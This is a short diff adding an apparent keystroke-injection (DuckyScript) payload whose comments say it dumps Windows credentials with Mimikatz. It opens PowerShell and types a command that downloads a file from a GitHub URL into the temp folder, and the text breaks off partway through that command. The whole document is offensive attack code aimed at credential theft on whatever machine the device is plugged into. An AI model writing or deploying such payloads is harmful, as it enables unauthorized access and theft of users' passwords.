@@ -1,0 +1,8 @@
+REM Dumps Windows credentials via MimiKatz
+DEFAULT_DELAY 400
+REM Open powershell
+CTRL ESC
+STRING powershell
+ENTER
+REM Download MimiKatz (using ULC to test)
+STRING Invoke-WebRequest -Uri 'https://github.com/UndedInside/ULC/ulc.cpp -OutFile $env:TEMP
